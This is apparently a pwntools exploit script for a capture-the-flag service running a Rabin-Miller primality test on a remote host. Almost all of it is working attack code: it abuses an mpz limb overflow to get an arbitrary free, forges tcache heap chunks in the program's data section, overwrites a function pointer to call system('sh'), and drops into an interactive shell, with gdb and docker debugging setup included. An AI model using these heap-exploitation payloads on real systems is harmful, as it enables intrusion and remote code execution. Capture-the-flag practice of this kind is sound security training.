import sys
sys.path.append("/home/pernicious/.local/lib/python2.7/site-packages")
from pwn import *
context.arch="amd64"

if 'rem' in sys.argv:
    r = remote("pycry.hackthe.vote", 5117)
else:
    if '-d' in sys.argv:
        os.system("sudo docker exec tw18 pkill -9 python")
        os.system("sudo docker exec tw18 pkill -9 gdb")
    r = remote("0", 5117)
    if '-d' in sys.argv:
        os.system("sudo docker exec tw18 pidof python > /tmp/ddd")
        pid = int(open("/tmp/ddd","r").read().split(' ')[0])
        script = '''
        b rabinMillerTest
        c
        fin
    python
    """
    types = gdb.execute("i var _Type", to_string=True)
    types = [t[t.index("PyTypeObject ")+13:-1] for t in types.split('\\n') if "PyTypeObject" in t]
    addrs = []
    for typ in types:
        addr = gdb.execute("p/x (unsigned long)&%s"%typ, to_string=True)
        addrs.append(int(addr.split(' = ')[1], 16))
    inf = gdb.selected_inferior()
    for fake in range(0x7a5010, 0x802000, 0x10):
        sz = struct.unpack("<Q", inf.read_memory(fake-8, 8).tobytes())[0]
        if sz&8 or sz&2 or sz&4 or sz < 0x10 or sz >= 0x420:
            continue
        print("CHUNK: 0x%x  (0x%x)"%(fake-0x10, sz))
    """
    end
        c
        fin
        c
        fin
        c
        fin
        c
        b *0x482ec8
        c
        '''
        open("/tmp/script.gdb","w").write(script)
        os.system("sudo docker cp /tmp/script.gdb tw18:/tmp/script.gdb")
        run_in_new_terminal("sudo docker exec -it tw18 gdb -q /python %d -x /tmp/script.gdb"%pid)
        pid = pidof("python")[0]
        proc.wait_for_debugger(pid)

def test(p, prob=None, rands=None):
    r.sendafter("test?\n", "%d\n"%p)
    if prob is None:
        r.sendafter(":\n", "\n")
    else:
        r.sendafter(":\n", "%f\n"%prob)
    if rands is None:
        r.sendafter(":\n", "\n")
    else:
        r.sendafter(":\n", "%d\n"%len(rands))
        for rr in rands:
            r.sendline(rr.encode('hex'))
def again():
    r.sendafter(":\n", "y\n")

p = 10702759692267312686702684597875885261419753760930973850923369194866810811252322292561506509566855731211637735198301848980795006778765375635248446976804501
prob = 1*10**6
rands = []
for i in xrange(256):
    rands.append("\xff"+p32(i))
# last mpz_t._m_limb (basically pointer to bytes) overwrites a saved mpz_t on the stack
# the saved mpz_t gets passed to mpz_clear, giving us an arbitrary free
# free a fake 0x320 tcache chunk within the data section
rands.append("\xff"+p64(0x4141414141414141)+p64(0x7b9860))

for i in xrange(len(rands)):
    rands[i] = rands[i].ljust(65, '\0')

# free tcache entry in data section
test(p, prob, rands)
again()

# reclaim and create new fake chunk of size 0x410
test(p, prob, ["A"*0x2e4+p32(0x411)])
again()

# free new fake chunk
rands[-1] = ("\xff"+p64(0x4242424242424242)+p64(0x7b9b70)).ljust(65, '\0')
test(p, prob, rands)
again()

# reclaim and again create new fake chunk
test(p, prob, ["B"*0x3d4+p64(0x411)])
again()

# free new fake chunk
rands[-1] = ("\xff"+p64(0x4242424242424242)+p64(0x7b9f70)).ljust(65, '\0')
test(p, prob, rands)
again()

# overwrite some useful stuff
pl = "C"*0x20c
pladdr = 0x7ba1a0
call_system = 0x503f01
pl += fit({
    0x0: "sh\0",
    0x8: pladdr+0x10-0x80,
    0x10: call_system,
    0x80: 0x482ec8
    }, filler="D")
pl = pl.ljust(0x3e0, "X")
test(p, prob, [pl])

r.interactive()
